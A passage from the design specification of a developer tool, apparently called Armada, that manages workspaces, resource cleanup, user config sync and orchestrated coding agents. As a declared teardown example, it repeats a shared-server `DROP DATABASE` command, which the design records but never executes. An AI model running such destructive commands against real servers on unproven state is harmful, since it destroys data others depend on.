  cluster:
    run:
      driver: command
      cmd: ./scripts/kind-up.sh ${port.api}
      stop: ./scripts/kind-down.sh
      ready: { exec: "kubectl get ns example" }
      owns:
        containers: "label=io.x-k8s.kind.cluster=armada-${workspace.id}"
        images: "label=armada.workspace=${workspace.id}"
        # declared selectors may use the id alone; Armada's own filters use BOTH labels
        ports: [api]
        files: [".kube/armada-${workspace.id}.conf"]
```

#### `owns:` at component level — what `setup:` created

`owns:` also appears directly on a component, where it describes what **`setup:`** produced
rather than what `run:` started. This closes a hole in §1's thesis: *"you cannot clean up what
you never claimed, and claiming happens at init"* — but `setup:` was the one thing that
created and never claimed.

```yaml
components:
  api:
    setup: ["bundle install", "rails db:create", "rails db:migrate"]
    owns:
      files: [node_modules, .venv]
      release: psql -h db.internal -c 'DROP DATABASE app_${workspace.id}'
```

**Only one of these is a genuine leak, and it is not the obvious one.** Three categories:

| `setup:` creates | Lives | Leaked when the directory is deleted? |
|---|---|---|
| `node_modules`, `.venv`, `target/` | inside the workspace | **No** — dies with it |
| A database inside an Armada-owned container | inside a labelled container | **No** — dies with the container |
| A database on a shared server, a cloud resource | outside Armada entirely | **Yes** |

So `rails-monolith`'s `db:create` is only a leak when Postgres is shared rather than a
armada-managed service.

**`release:` is recorded, reported, and never executed by Armada.** An earlier draft had `clean`
run it — including under `--orphaned`, from outside any workspace, resolving granted secrets at
that moment. That made the most destructive operation in the tool run under the flag §3.3
documents as *"always safe… it can never disturb a live agent."*

The plan already faces this exact choice for orphaned process groups and answers it correctly
(§2.3.1): **report it, do not act on state Armada cannot prove is stale.** A stale
`DROP DATABASE` is strictly more dangerous than a stale `kill`, so the same answer applies with
more force.

```
armada manifest status --all
  workspace a3f91c02 (directory deleted) declared an external resource
  Armada did not reclaim:
      psql -h db.internal -c 'DROP DATABASE app_a3f91c02'
```

Two mechanisms disappear with it: `manifest.db` never stores a secret *reference*, and
`ARCHITECTURE.md` §1.8's invariant needs no clause about them.

It is still recorded at `armada manifest init` rather than read from the repo at `clean` time — A teardown script symmetric with `setup:` would
live *in the workspace* — so in the orphan case, the one that actually matters, it has been
deleted along with everything else. A resolved command string in the machine-global store runs
from anywhere:

```
declared   psql -h db.internal -c 'DROP DATABASE app_${workspace.id}'
recorded   psql -h db.internal -c 'DROP DATABASE app_a3f91c02'
           reported   by armada manifest status --all when the workspace is gone — never executed
```

**Only the command and the references are recorded.** Recording a resolved credential would
put a plaintext secret in `manifest.db` permanently, surviving `clean` by design — which is why
`ARCHITECTURE.md` §1.8's invariant now names that database explicitly. 

**`files:` are removed only by `armada manifest clean --artifacts`, never by plain `clean`.** They cost
disk but leak nothing machine-global, and deleting them means the next `init` pays a full
reinstall — minutes an agent did not ask to spend. `--artifacts` composes with the scope lens,
so `armada manifest clean --artifacts --all` is the reclaim-disk-on-this-machine answer. It is a no-op
under `--orphaned`, where the directory and its files are already gone.

**Armada never guesses which files are artifacts.** Inferring `node_modules`, `.venv`, `.next`
from a repo scan is a stack-detection engine, which §5 rules out. They are declared, or they
are not Armada's.

~60 lines instead of a plugin API, no versioned contract, and `clean` stays correct for
resources Armada never created directly. If a third real driver ever proves necessary, `owns:`
is the interface you would have designed anyway.

---

## 7. Non-goals

Each of these is a plausible-sounding feature that multiplies maintenance without moving any
of the six verbs.

- **Inferring intent from a repo scan.** Layer 1 reports facts only.
- **A build DAG with caching.** turbo and nx own this: task graphs over build outputs, content
  hashing, cache restore. Armada has none of it. It *does* schedule checks under constraints —
  `needs:` ordering **between checks as well as against components** (§4.1), a `cost:` budget,
  `exclusive:` mutexes — which is a scheduler, not a build graph, and `ARCHITECTURE.md` §1.2
  spends a page on getting it right. **The line is outputs:** Armada knows that one check runs
  after another passes; it never learns what a check produced, whether that output changed, or
  whether the work could have been skipped. Content hashing, cache restore and staleness stay
  out, and the moment any of them arrives Armada has become turbo, badly. An earlier draft phrased
  this non-goal as "task dependency DAG", which disclaimed something the design contains and
  would therefore have stopped nothing.
- **A driver plugin system.** See §6.1.
- **Mandatory output parsing.** Optional `parse:` keys only. Exit code plus captured stream
  must *always* be a complete answer, or every upstream tool release breaks you.
- **An agent inside Armada.** Armada must not call a model to diagnose, repair, or explain. It is
  a tempting feature — `claude -p` exists, agent CLIs are already on `PATH`, and no API token is
  needed because the user's own session provides auth — and it is still wrong here, for four
  reasons that compound:

  **Armada's caller is already an agent.** `armada manifest check --json` is consumed by a coding agent that
  has the repo, the diff, the stack trace and the conversation that produced it. A subprocess
  model gets a fresh context and none of that, so it answers worse, slower, at the caller's
  expense. That is the whole argument; the rest is why it cannot be rescued by care.

  **Availability is exactly inverted.** On a dev machine the agent CLI is present and redundant.
  In CI — nobody watching, the case that actually needs an explanation — it is absent and
  unauthenticated. The feature is easiest where it is least needed.

  **It would breach `ARCHITECTURE.md` §1.8 and §4.7.** Piping a stack trace to an external CLI sends repo content,
  and possibly the values Armada scrubbed out of its own logs, to a service. The invariant is that
  Armada never emits a secret it was given; a diagnosis channel that bypasses the scrubber is that
  invariant with an exception, which is not an invariant.

  **It is nondeterminism on the critical path of a merge gate.** `exit = f(error.class)`,
  exhaustive enums, hand-regenerated golden snapshots and a measured 65 ms floor on `check` are
  all one commitment. A 3-to-30-second call to a service that can be offline, rate-limited or
  simply different today is the opposite commitment.

  **Reserved, not forbidden — and the shape is already decided if it is ever built.** It is a
  separate verb (`armada manifest explain --agent`), never a flag that fires on failure; it consumes
  §3.4's bundle rather than raw output, so the scrubber still applies; it is strictly read-only,
  printing prose and never writing a file, re-running a check, or influencing `status` or the
  exit code; and with no agent CLI on `PATH` the behaviour is identical minus the prose. It is
  the one layer that can be deleted without loss, which is the test it has to keep passing.

  **What "self-healing" already means here, deterministically:** automatic reaping at `init` and
  `clean` (§2.3.1), lease reclamation from a cold heartbeat (§4.3), `boot_id` liveness so a
  reboot does not strand pgids, SIGTERM→SIGKILL escalation (§6), `--force-rebuild` for an
  unreadable `manifest.db`, and the `environment` class telling a caller to fix the machine rather
  than the repo. Repair belongs to the tools: `--fix` dispatches `ruff --fix`, and the tool
  fixes while Armada runs it.

- **A growing MCP surface.** One thin wrapper over the same importable layer. The CLI with
  `--json` works in harnesses with no project-scoped MCP at all.
- **Secrets management beyond injection.** §4.7 resolves a reference and injects it. Armada
  does **not** store, generate, rotate, share or sync secrets, and does not implement a
  provider — a provider is a command that prints to stdout. The moment Armada holds a secret at
  rest it has become a secrets manager, and there are better ones.
- **Windows support.** Process groups, signals and file locks are load-bearing. Say
  POSIX-only in the README's first paragraph.
- **Multi-repo workspaces — reserved, not built.** `components[].root` is already a path;
  letting it point outside the workspace root (`root: ../api`) would get ~80% of multi-repo
  for free. Costs: a git diff *per* root rather than one, and the id can no longer be "hash
  of one path". Worth doing, but only once the two-repo setup actually exists.

---

## 8. Phases

> **Moved to [`PHASES.md`](PHASES.md).** Sequencing changes every phase and is read one
> section at a time; this document is the contract, and phase 1 has landed, so it is frozen.

---

## 9. Source material

> **Moved to [`PHASES.md`](PHASES.md).**

---

## 10. Decisions already made — do not relitigate

| Decision | Choice | Why |
|----------|--------|-----|
| Language | **Rust** (2021 edition) | **Reopened and re-decided in phase 0 — see below.** The reducer's `State`/`Event`/`Action` types are the scheduler's specification, and Rust is the only candidate whose compiler enforces that specification. |
| Package name | **`Armada`** | `armada` is taken on crates.io. Binary stays `armada`; the package name appears once, in the bootstrap line. |
| Distribution | **GitHub Releases + `install.sh`** | A single static binary — a ~2 MB floor, measured — with no runtime to provision. Homebrew tap later. |
| Supervision | **Start-and-track only** | Restart-on-crash and log aggregation are a permanent bug class for marginal gain. |
| Config shape | **One `components:` mapping** | `units` + `services` were the same thing split in two; the both-axes case read as duplication. |
| Config format | **YAML, statically verifiable** | Generator script is the escape hatch. Starlark would force `config verify` to execute untrusted code. |
| Driver extensibility | **`owns:`, not a plugin API** | Gets the one real benefit of a custom driver at ~60 lines. |
| Concept naming | **Keep "workspace"** | Already means this in VS Code / Terraform / cargo / pnpm. Do not invent vocabulary for concepts that already have names. |
| Build order | **Greenfield repo, source repo last** | Isolation requested; keeps the source repo's merge gate out of the blast radius. |

### 10.1 Why the language was reopened, and what decided it

This row previously read **Python**, on two grounds. Both were written before decisions that
invalidated them, which is why it was reopened rather than relitigated.

| Original ground | What happened to it |
|---|---|
| *"Keeps 6,169 working lines, plus the test suite"* | **Void.** §2.7 of `ARCHITECTURE.md` made phase 3 a clean-room rewrite and forbade the harvest document from carrying implementation. Zero lines transfer regardless of language. |
| *"The language was never the requirement"* | True — and it argues the choice is *free*, not that Python is right. |

A third assumption also failed: the owner is not a Python developer, so familiarity favoured
nothing. With every original ground gone, the decision was made on measured properties.

**What decided it.** The same reducer was written in four languages, an `Event` variant added,
and left unhandled:

| | Result |
|---|---|
| **Rust** | `error[E0004]: non-exhaustive patterns` — unconditionally |
| TypeScript, Python + mypy strict | Caught only via return-type pressure; a `void`/`None` reducer compiles clean |
| Go | `build` and `vet` both pass. The event is **silently dropped** |

`ARCHITECTURE.md` §1.2 spends a page establishing that the scheduler must be a reducer because
a deadlock there is the one bug class greenfield development structurally cannot catch, and `ARCHITECTURE.md` §1.2
establishes those types as the scheduler's specification. Only one candidate can hold that
specification in the type system.

Supporting, all measured: 4.8 ms cold start against Python's 116 ms; a ~2 MB static binary
against a ~108 MB Python install; `TransactionBehavior::Immediate` as a typed argument rather
than a driver-specific DSN string; newtypes that make `workspace_id` and `project_id`
unconfusable when both are 8-character hex; and `rmcp` is the only MCP SDK shipping the Tasks
extension.

**The cost accepted, stated plainly.** `rmcp` released three major versions in five months —
v1.0.0 in March, v2.0.0 in June, v3.0.0 in July. Go's SDK has had no breaking
major since September 2025. That churn is real and ongoing.

It is accepted because the blast radius is bounded **by decisions already made**: §7 makes a
growing MCP surface a non-goal, and §1.3 of `ARCHITECTURE.md` means the MCP server calls the
same core functions the CLI does. A breaking `rmcp` release therefore hits one adapter module
behind a protocol boundary — never the core, the scheduler, or the CLI. Pin the version;
upgrade deliberately.

Two further costs go in [`traps.md`](traps.md) as rules, because both sit in machinery §7 calls
load-bearing: Rust sets `SIGPIPE` to `SIG_IGN` at startup, so `armada manifest status | head` panics until
fixed; and `setsid` is not in `std`, so detaching a process group needs `unsafe pre_exec`.

**Do not reopen this again without new measured evidence.** It has been examined twice, by
independent analyses reaching the same conclusion from different reasoning.

---

## 11. Risks

> **Moved to [`PHASES.md`](PHASES.md).**

---

## 12. Notes for the implementing agent

> **Moved to [`PHASES.md`](PHASES.md).**

---

# Part II — the three modules charkit did not have

Everything above specifies **Manifest**: what a workspace is, how it is configured, how it is
owned and reclaimed. That specification is unchanged by the widening of scope, because Manifest
is agent-agnostic by design ([`ARCHITECTURE.md`](ARCHITECTURE.md) §1.9) and nothing below cares
what a workspace is used for.

What follows specifies the three modules stacked on top of it. Each is deliberately thinner
than §1–§7, because the M0 spike found that most of the machinery they appeared to need already
exists ([`PHASES.md`](PHASES.md) §9.1).

---

## 13. Guild — the portable half

The guild is **machine-global user state**, not repository content. It is you: how you work,
how you want to be spoken to, which skills and plugins you use, what your workflows are. Armada
builds it by interviewing you, seeds it from what is already on the machine, and syncs it
between your machines. **No part of it ever enters this repository.**

### 13.1 Layout, and the line between what syncs and what does not

```
~/.armada/
├── guild/                 # SYNCS — a git repo Armada manages
│   ├── voice.md
│   ├── expectations.md
│   ├── how-i-work.md
│   ├── skills/
│   ├── hooks/
│   ├── subagents/
│   ├── workflows/         # design.yml · plan.yml · feature.yml · bug.yml
│   ├── plugins.yml        # marketplaces + enabled plugins
│   └── mcp.yml            # servers you want everywhere
├── manifest.db            # NEVER SYNCS — ports, containers, leases on THIS machine
├── jobs/                  # NEVER SYNCS — the Job index
├── workspaces/            # NEVER SYNCS — the git worktrees themselves
└── machine.yml            # NEVER SYNCS — paths, secrets, capacity
```

**The line is not "content syncs, state does not".** The guild *is* state and it *does* sync.
The line is: **what describes you syncs; what describes this machine and its running processes
never does.** Syncing `manifest.db` to another machine would claim ports that do not exist
there and record containers that were never started.

### 13.2 Why it is not repository content

An earlier draft committed guild content to a repository — either this one, publishing personal
material, or a second private one to keep in step. Both were wrong. Making the guild global
deletes the distribution problem rather than solving it: Claude Code already reads `~/.claude/`
on every project, so a global guild is in effect everywhere with **no per-repository step at
all**.

Projection survives only for what must be repository-local: a managed region in the repo's own
memory file, and any MCP server or setting that only makes sense there. That is the sole part
that needs reversible bookkeeping — a manifest of what was placed and a hash of each file, so
re-sync updates only what you have not touched and `--remove` reverses exactly.

### 13.3 Packaging: what a plugin can and cannot carry

[`PHASES.md`](PHASES.md) §9.1 F4 measured this. A Claude Code plugin carries skills, subagents,
hooks, MCP servers, monitors, LSP servers and a `bin/` added to `PATH` — but **cannot carry a
memory file**, and a plugin's own `settings.json` supports only two keys.

So Guild has two halves. The mechanical half ships as a plugin and inherits Claude Code's
installer, versioning and marketplace for free. The personal half — the memory fragments and
the settings keys — Guild writes itself. The second half is smaller and is where all the value
is.

### 13.4 The interview

`armada init` on a machine with no guild asks one question first — *do you already have a
guild?* — with three answers: pull it from a remote, import a bundle, or build one now. Only
the third reaches the interview.

#### Import runs first, and does most of the work

Building a guild starts by **reading what is already there**: `~/.claude/` skills, subagents,
hooks, plugin and marketplace registrations, settings, and `CLAUDE.md`. The guild starts nearly
complete rather than empty, which is the difference between a tool you configure once and one
you abandon during setup.

**`CLAUDE.md` is split into the three fragments of §13.1** — `voice.md` (how to talk),
`expectations.md` (what "done" means), `how-i-work.md` (process and tooling). Each is
separately editable and separately projected, which one file would not be.

#### Five questions, and none of them ask you to confirm the import

The interview asks what cannot be read from the machine, **from scratch**:

| # | Asks | Default if skipped |
|---|---|---|
| 1 | How do you want to be spoken to? | whatever import wrote to `voice.md` |
| 2 | What does "done" mean — when is work finished? | `expectations.md` as imported |
| 3 | How do you work? Branching, review, what you want done without asking. | `how-i-work.md` as imported |
| 4 | Default budget ceilings. | the per-workflow ceilings in §14.6 |
| 5 | A private git remote to sync the guild to. | none — sync is off, `export` still works |

**It does not show you a parsed split and ask you to correct it.** That was considered and
rejected: reviewing a machine's guess at how to carve up your own memory file is more work than
answering the question, and it produces a worse answer — you would be editing its interpretation
rather than saying what you mean. Import populates the files; the interview asks fresh; your
answers win where they overlap.

**Four starter workflows are not confirmed either.** They are copied, and
`armada guild edit` changes them. A confirmation step on a file you have not read yet is
theatre.

#### Onboarding a repository is a shipped skill, and the guild owns it after that

`guild init` writes [`templates/guild/skills/onboard-repo/`](../templates/guild/skills/onboard-repo/SKILL.md)
into `~/.armada/guild/skills/`, on the same terms as the four workflows: a starter you did not
have to author, yours to edit from the moment it lands.

**The procedure is user-level even though the answers are repo-level.** How you want to be
onboarded — asked one task at a time, shown where each guess came from, nothing written before
you confirm — is the same in every repository. *Which* script is the test command is not, and
that comes from the scan every time. Conflating the two is what makes the distinction look
wrong.

**Why ship one rather than leave it to a prompt.** Without it, onboarding is as good as the
sentence you happened to type that day, and the step most likely to be dropped is the last one —
a real `config verify` before declaring success. The skill exists so "configured" means verified
rather than asserted, every time.

**It is also the guild's first real content.** A guild whose `skills/` directory is empty on day
one is a concept; one with a skill you can read and edit is a thing.

#### It can always be skipped

Every question has a default, and `armada init --defaults` takes all of them. A skipped
interview leaves a working guild and `armada doctor` reports it as incomplete, naming the
fragments that are still whatever import produced.

**A tool that can only be configured through a wizard is a tool you cannot fix at one in the
morning.** Everything the interview writes is a plain file in `~/.armada/guild/`; editing those
directly is the supported path, not a workaround. What the interview must never do is finish
silently in a state that looks configured and is not — the same rule the privacy gate now
follows (`ARCHITECTURE.md` §2.4).

### 13.5 Sync

`~/.armada/guild/` is a git repository Armada manages: it commits on change and pushes to a
private remote named once during the interview. `export` and `import` produce a single bundle
for a machine that will never hold your credentials. Conflicts surface as conflicts.

The import step **refuses to adopt credential-shaped values**; those belong in `machine.yml`,
which never syncs. This is built with the importer rather than retrofitted, because a secret
that has already reached a remote cannot be un-pushed.

---

## 14. Fleet — the agents you do not talk to

### 14.1 A Job and a Drone are not the same thing

**The Job is durable. The Drone is not.** A Job is a UUID, a git worktree, a port block, a
transcript, a budget and — when it finishes — a verdict. A Drone is the process executing it.
One Job has at most one live Drone, and over its life it may have several: a Drone that exits,
crashes or is killed does not end the Job, because everything the Job *is* survives on disk.

This is the single most important correction in the plan's history, and it is why the two words
exist. Three successive designs — a hidden multiplexer, an Armada-owned pty, a bespoke session
journal — all descended from the assumption that the unit of work must be a live terminal
somebody owns. It need not be, because Claude Code already persists the conversation itself
([`PHASES.md`](PHASES.md) §9.1 F1).

| | Job | Drone |
|---|---|---|
| Lives in | `~/.armada/jobs/`, plus a worktree and a Claude transcript | a process table |
| Created by | `armada fleet spawn` | starting or resuming a Job |
| Survives a crash | **yes** | no |
| Carries | uuid, worktree, port block, budget, workflow, verdict | a pid and a process group |
| Ends when | it reaches a verdict or a ceiling (§14.3) | the process exits |

Fleet mints the Job's UUID **before anything runs**, so the durable handle exists before the
process does, ownership is recorded up front, and cleanup can find the Job afterwards even when
the directory is gone. Worktrees live under `~/.armada/workspaces/`, outside the repository, so
a stray delete in the parent cannot take out live work.

**A Job with no live Drone is the ordinary resting state, not an error.** It is what you have
after a Drone finishes a turn, after a crash, and after a reboot; `armada fleet board` is how
you enter it and Claude Code's `--resume` is what actually reattaches the conversation. An
earlier draft of the vocabulary reached for an idle *pool* of pre-warmed Drones to explain
this state and was dropped: a pool means processes alive with nothing to do, which is a daemon
under another name (§4.3), and it is unnecessary once the Job is the thing that persists.

Fleet invents no worktree concept. `git worktree` is the only primitive; Fleet adds **policy
only** — where it lives, what it is named, that it gets a port block from Manifest, and that it
is recorded.

> **Underneath, a Job's conversation is an ordinary Claude Code session** — `--session-id` to
> mint it, `--resume` to re-enter it, a transcript at
> `~/.claude/projects/<slug>/<uuid>.jsonl`. Job and Drone are Armada's names for the two halves
> Claude Code leaves undistinguished; they are not a second session mechanism, and nothing in
> [`PHASES.md`](PHASES.md) §9.1 F1 changes.

### 14.2 Classification belongs here, not to Helm

One cheap model call turns task text into a workflow name, with an explicit override and the
confidence surfaced so a guess is visible as a guess. It lives in Fleet because it is needed the
moment a Job can be spawned — long before Helm exists. Putting it in the orchestrator
would make every other caller worse for no gain ([`ARCHITECTURE.md`](ARCHITECTURE.md) §1.9).

### 14.3 Verdicts and ceilings — the two ways a loop ends

A loop terminates because it succeeded, or because it ran out of rope. Both are required, and
neither is optional.

**The verdict** reuses the `--json` envelope of §3.1 with one added field, so the system has
exactly one machine-readable output shape:

```json
{
  "schema_version": 1,
  "module": "fleet",
  "step": "implement",
  "verdict": "PASS",
  "evidence": [
    { "kind": "check", "scope": "test", "exit": 0 },
    { "kind": "check", "scope": "lint", "exit": 0 }
  ],
  "attempts": 2,
  "next": "review"
}
```

| Verdict | Meaning |
|---|---|
| `PASS` | Advance to `next`. |
| `FAILED` | Retry the same step with the evidence attached, until a ceiling stops it. |
| `BLOCKED` | Cannot proceed without an external change. Stop, record why, raise to the inbox. |
| `NEEDS_HUMAN` | A judgement call is yours — or a ceiling was reached. |

#### Three enums, and the one rule they share

A verdict answers *how did the step end*. It is not the same question as *what is this Job
doing right now*, and conflating them is what produced four competing status vocabularies in
earlier drafts. There are exactly three, each owned by one module:

| Enum | Owner | Values |
|---|---|---|
| **Status** | Manifest | `READY` `UP` `DOWN` `CLEAN` `PASS` `OK` `SKIPPED` `PARTIAL` `FAILED` `ABORTED` `DEAD` `TIMEOUT` `RUNNING` `WAITING` (§3.1) |
| **Job state** | Fleet | `QUEUED` `RUNNING` `PAUSED` `STALLED` `BLOCKED` `ABORTED` `DONE` |
| **Verdict** | Fleet | `PASS` `FAILED` `BLOCKED` `NEEDS_HUMAN` |

**The shared rule: one spelling, everywhere, and it is the JSON spelling.** `FAILED`, never
`FAIL`; SCREAMING in both the payload and the human render. `crates/core/src/error.rs` already
enforces this for Status with a test, and Fleet inherits it rather than reinventing the
`FAIL`/`FAILED` split an earlier draft had to remove (§3).

**Why Manifest's Status is not extended to cover Jobs.** `BLOCKED` is a legal Job state and a
legal verdict, but it is deliberately *not* a Manifest terminal state: exit codes are
`f(error.class)`, a blocked run carries no class, and a merge gate would therefore read exit
`0` as success (§3.1). The two enums stay separate because that constraint applies to one of
them and not the other.

**`STALLED` is Fleet's, and it is an observation rather than a state the Drone reports.** A Job
is stalled when its Drone has produced no transcript activity inside a window — the one
condition a busy Drone cannot self-report, which is why it belongs to the observer.

**The rule that keeps this honest: a verdict is only `PASS` if it carries evidence an external
command produced.** An agent asserting that tests pass is not evidence; an `armada manifest
check` exit code is. This is why the loop genuinely depends on Manifest's `check` verb and
cannot be faked earlier.

**The ceilings** come from the guild, are overridable per workflow and per run, and are read off
data Claude Code already emits — `total_cost_usd`, `usage`, `num_turns` and `duration_api_ms`
from the turn's `result` event ([`PHASES.md`](PHASES.md) §9.1 F2). Fleet builds no accounting
layer.

```yaml
budget:
  max_iterations: 12
  max_tokens: 400000
  max_wall_clock: 45m
  on_exhausted: needs_human   # never: silent stop
```

`rate_limit_event` reports the current window and its reset, so the orchestrator can decline to
spawn when a reset is close. That is strictly better than a fixed concurrency cap, which was
only ever a proxy for the same thing.

**Exhaustion is a first-class outcome, not a crash.** The Drone stops, the Job records what it spent
and where it reached, and raises it to the inbox.

### 14.4 Workflows are data, not code

A workflow is a file in your guild — its ordered steps, which skill runs each one, and what
verdict advances it. The alternative is a Rust function, which would mean editing, rebuilding
and releasing to change "run review before the check instead of after". As data it syncs between
machines with the rest of the guild and can be fixed at one in the morning.

```yaml
# ~/.armada/guild/workflows/bug.yml
steps:
  - id: reproduce
    skill: reproduce-bug
    verify: { must: failing_test_exists }   # the test must FAIL first
  - id: fix
    skill: implement
    verify: { must: check_passes, scope: [test, lint] }
  - id: land
    skill: commit-local
on_blocked: needs_human
```

| Type | Terminal gate | Ends at |
|---|---|---|
| **design** | Always `needs_human` — design has no automated pass condition | A review artifact |
| **plan** | `needs_human` on the finished plan | Your approval, before any build workflow spawns |
| **feature** | `check` green and review clean | A local branch |
| **bug** | The test must fail first, then pass | A local branch |

Design and plan **always** end at you. Only feature and bug can close autonomously, and only
because `check` gives them something objective to close against.

### 14.5 Where a Drone's skills come from, and who wins a collision

A Drone sees skills from two places, and they are owned by different modules:

| Source | Owner | Is |
|---|---|---|
| `~/.armada/guild/skills/` | Guild (§13) | How **you** work. Present in every repo. |
| `armada.yml`'s `skills:`, rendered | Manifest (§4.8) | How **this repo** works. |

**Merging them is Fleet's job**, and structurally can only be Fleet's: Guild and Manifest are
siblings and neither may reference the other (`ARCHITECTURE.md` §1.9), so Fleet is the lowest
module that can see both. It projects the merged set into the Job's worktree at spawn.

**The repo wins a name collision, and the shadow is always reported.** A bare `implement`
resolves to the repository's; `guild:implement` reaches the shadowed one explicitly. Both
`armada fleet ls --skills` and `armada doctor` name every shadow they find.

The reasoning, since this one has a real cost either way:

- **The specific context beats the general one.** A repo declaring `implement` is saying
  "implementing *here* means running codegen first", and honouring that is the entire reason
  repo skills exist. Namespacing everything would make workflows carry a per-repo prefix, which
  is the per-repository setup step Armada was built to delete.
- **The cost is that a repository can change what your own workflow step means.** That is
  tolerable only because it is never silent, which is why the shadow report is part of the rule
  rather than a nicety.
- **A repo skill can still only invoke commands that repo already declared** (§4.8), so a
  shadow can redirect judgement but cannot smuggle in capability.

> **Reserved, not built: a trust boundary for repositories you did not write.** Everything above
> assumes you are the author or the reviewer. Running Armada across cloned third-party
> repositories makes a repo skill an instruction channel into your agent from a file you never
> read, and the honest answer is a per-repository trust decision rather than a global policy.
> No fixture needs it yet, and guessing at the shape now would be worse than leaving the hole
> named.

---

## 15. Helm — the one agent you do talk to

### 15.1 Helm is a conversation; the Bridge is a screen

**Helm** is a Claude Code session running an orchestrator persona from your guild, with Armada's
MCP server as its toolbelt, resuming the same conversation each day. Typing `armada` with no
arguments enters it; `armada helm` is the explicit spelling.

Its toolbelt is `fleet.*` and `manifest.*` — spawn, status, probe, answer, kill, and the
workspace verbs. Its job is **decompose, delegate, aggregate, report**. Classification is not
its job (§14.2).

> **No `helm` binary is ever installed.** Helm is a subcommand and the bare-`armada` default,
> never a program on `PATH`. Kubernetes' Helm already owns that name, and Armada is expected to
> run on machines that have it — the `python-ml` fixture shells out to `kind` and `kubectl`
> (§6.1). Shipping a second `helm` would shadow a tool the user depends on to do their actual
> work, which no naming preference justifies.

**The Bridge** is the other half: a full-screen live view of every Job and its state, redrawn in
place like `htop` or `k9s`. It is reached as `armada bridge`, or `/bridge` from inside Helm.
Helm is where you *talk*; the Bridge is what you *watch*. They share the Fleet data and neither
owns the other.

> **This reverses an earlier deferral, deliberately.** Previous drafts held the ambient view
> back as "the only decision that gets cheaper and better-informed by waiting", on the argument
> that cmux and the Claude app already list sessions. The counter-argument that won: a session
> list is not the thing being deferred. What the Bridge shows is Job state, budget spend against
> a ceiling, and who needs an answer — none of which any other tool can know, because none of
> them mint the Jobs. Deferring it meant deferring the only view of data Armada alone holds.

**Nothing in Manifest, Guild or Fleet moves when the Bridge is built**, and that property is
retained rather than spent. The Bridge is a renderer over `fleet.*`; it holds no state, and Helm
works fully without it.

### 15.2 Two structural rules

**The orchestrator reads summaries, never raw transcripts.** If it reads Drone transcripts it
fills its window in three days of work and starts forgetting the fleet. This is a design constraint,
not a tuning knob.

**Probe never interrupts a Drone.** It summarises the Drone's transcript with a cheap model.
Messaging a busy agent to ask how it is going costs you the thing you were measuring.

### 15.3 The inbox — how it stays aware without polling

Drones append to `~/.armada/inbox.jsonl`: by MCP call when they have a question, and by `Stop`
and `Notification` hooks when they go idle or get stuck. **Hooks are the spine** — an agent can
forget to report progress, but it cannot forget to stop, which is what makes "needs my
attention" reliable rather than best-effort.

Two mechanisms deliver it, both verified in [`PHASES.md`](PHASES.md) §9.1 F3:

| Mechanism | When it fires | Role |
|---|---|---|
| A plugin **monitor** tailing the inbox | Mid-turn, live | Push |
| A **`Stop` hook** on the orchestrator | Turn end, if anything is unread | Backstop — nothing is ever lost |

Both are configuration rather than code. **No daemon**, and no polling: the file is
append-only, so it survives every kind of crash, which is the same reasoning that put Manifest's
ownership store on disk rather than in a process (§4.3).

A monitor runs in interactive sessions only. That fits — Helm is interactive and Drones are
headless — but it means a monitor can never be a Drone-side mechanism.

### 15.3.1 Reserved, not built: raised items need identity

**The complaint this exists to fix.** An agent hands you a table of things to deal with and the
table just sits there. Acknowledging one means typing a sentence — *"I did the second one"* —
and having a small conversation about it. The cost is not the typing; it is that a list of
things you must act on is indistinguishable from a list of things you have already acted on, so
the list stops being trustworthy after the first item.

**The diagnosis: items Helm raises in prose have no identity.** The inbox already has the whole
mechanism for Jobs — `fleet.ask_human` raises an entry, `armada fleet answer <job> "…"` responds
to it, and the Bridge binds `a` to exactly that. What has no id is the *thing inside a sentence*.
"Three things need you" is prose, and prose cannot be acknowledged one row at a time.

So the shape of the answer is not a UI feature. It is that **every item Helm surfaces is an
inbox entry with an id, whether it renders in the Bridge, in a table, or mid-sentence** — and
acknowledgement is one keystroke against that id, not a reply. The Bridge is then a renderer
over the same entries it already renders, and Helm's prose becomes a second view of them rather
than a separate channel.

**Design questions this leaves open**, and they are the reason it is reserved rather than
specified:

- **What acknowledgement means.** *Done*, *not doing it*, and *not yet* are three different
  answers, and collapsing them to a tick loses the one that matters — a dismissed item and a
  deferred item behave differently the next time Helm reports.
- **Whether Helm needs telling.** If you mark a thing done, does the Drone that raised it resume
  on that fact, or is the acknowledgement purely yours? Both are defensible and they are
  different products.
- **Where the keystroke lives.** Inside the Helm session, in the Bridge, or in a notification —
  and a session that is a plain Claude Code conversation has nowhere obvious to put one.

**Not scheduled.** It wants its own design pass, and it is downstream of the inbox and the
Bridge both existing.

### 15.4 The persona, and the four things it decides

Helm *is* a persona plus a toolbelt. The persona is guild content — yours, editable, synced
(§13.1) — but Armada ships a starter, because a guild built by `armada guild init` has to
contain something on the first run. It lives at
[`templates/guild/subagents/helm.md`](../templates/guild/subagents/helm.md) and is copied into
`~/.armada/guild/subagents/helm.md`, after which it is yours and Armada does not touch it again.

Four behaviours were decided rather than left to the model, because each one has a failure mode
that only shows up after weeks of use:

| Decision | Why it is not a preference |
|---|---|
| **Interrupt only for `BLOCKED` and for judgement calls.** Everything else waits for your next exchange. | Running several Jobs is how you stop watching them. A Helm that narrates completions turns "needs me" into noise, and a diluted signal gets ignored at the moment it matters. |
| **Spawn without asking when classification is confident.** Confirm when confidence is low, or when the workflow is `design` or `plan`. | You asked for work; making you approve each spawn hands the scheduling back. The two exceptions are where an unconfirmed spawn wastes a budget: a misclassification, and a workflow that always ends at you anyway (§14.4). |
| **Never do the work.** A one-line fix still gets a Job. | §15.2's argument applied to actions rather than reading. A Helm that edits files fills its own context, and a full-context Helm forgets the fleet — the one thing nothing else can do for you. |
| **Report failure with evidence; never re-spawn.** | The workflow's ceiling already governs retries (§14.3). By the time it reaches Helm the rope has run out, and an automatic retry doubles the bill for the same wrong approach before you have seen the first failure. |

**"Never do the work" is enforced structurally, not asked for.** The persona's `tools:` list
contains Armada's MCP tools and nothing else — no `Read`, no `Edit`, no `Bash`. A rule the
prompt merely requests is a rule that erodes under pressure; a capability that was never granted
does not.

**The persona also carries how you want to be spoken to** — bottom line first, brief, tables
over prose, and every item labelled with who acts. That is voice, it belongs to the guild, and
it is the half of Guild that plugins cannot carry (§13.3).

### 14.6 The four workflows, and the predicates they gate on

The starter set ships at [`templates/guild/workflows/`](../templates/guild/workflows/) and is
copied into `~/.armada/guild/workflows/` by `guild init` (§13.4). From that moment they are
yours — a workflow is data precisely so "run review before the check instead of after" is a
one-line edit rather than a release.

| Workflow | Shape | Ends at |
|---|---|---|
| **design** | explore → articulate → hand over | You. Design has no automated pass condition — no command can tell you an approach is right. |
